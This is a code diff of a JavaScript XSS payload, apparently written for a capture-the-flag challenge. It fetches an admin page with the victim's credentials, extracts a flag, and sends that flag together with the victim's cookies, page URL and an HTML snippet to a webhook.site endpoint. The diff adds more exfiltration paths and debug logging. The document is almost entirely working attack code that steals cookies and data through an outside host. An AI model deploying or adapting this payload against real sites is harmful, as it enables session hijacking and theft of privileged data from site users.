@@ -1,38 +1,60 @@
-<!DOCTYPE html>
-<html>
-<body>
 <script>
-  // Use the FULL admin URL with port
+  console.log('Starting exploit from:', window.location.origin);
+  console.log('Cookies:', document.cookie);
+  
+  // Test which origin we're on
   fetch('http://94.237.61.52:42667/admin', { 
     credentials: 'include',
     mode: 'cors'
   })
-    .then(r => r.text())
+    .then(r => {
+      console.log('Response status:', r.status, r.statusText);
+      return r.text();
+    })
     .then(html => {
-      // Extract flag from h4 tag
-      const match = html.match(/<h4>([^<]+)<\/h4>/);
-      const flag = match ? match[1] : 'NOT_FOUND_IN_H4';
+      console.log('Got HTML length:', html.length);
       
-      // Also look for any flag pattern
-      const flagPattern = html.match(/flag{.*?}/i);
-      const foundFlag = flagPattern ? flagPattern[0] : flag;
+      // Multiple extraction methods
+      let flag = 'NOT_FOUND';
       
-      // Send flag to webhook
-      new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?flag=' + encodeURIComponent(foundFlag);
+      // 1. Look for h4 tag
+      const h4Match = html.match(/<h4>([^<]+)<\/h4>/);
+      if (h4Match) {
+        flag = h4Match[1].trim();
+        console.log('Found flag in h4:', flag);
+      }
       
-      // Send cookies too
-      new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?cookies=' + encodeURIComponent(document.cookie);
+      // 2. Look for flag pattern
+      if (flag === 'NOT_FOUND') {
+        const flagPattern = html.match(/flag{.*?}/i);
+        if (flagPattern) {
+          flag = flagPattern[0];
+          console.log('Found flag pattern:', flag);
+        }
+      }
       
-      // Send a snippet of the HTML for verification
+      // 3. Send to webhook with metadata
+      const payload = {
+        flag: flag,
+        cookies: document.cookie,
+        origin: window.location.origin,
+        url: window.location.href,
+        htmlPreview: html.substring(0, 1000),
+        timestamp: new Date().toISOString()
+      };
+      
+      // Multiple delivery methods
+      new Image().src = `https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?simple_flag=${encodeURIComponent(flag)}`;
+      
       fetch('https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab', {
         method: 'POST',
         mode: 'no-cors',
-        body: 'ADMIN_PAGE_SNIPPET: ' + html.substring(0, 500)
+        body: JSON.stringify(payload)
       });
+      
     })
     .catch(err => {
-      new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?error=' + encodeURIComponent(err.message);
+      console.error('Fetch error:', err);
+      new Image().src = `https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?fetch_error=${encodeURIComponent(err.message)}`;
     });
 </script>
-</body>
-</html>
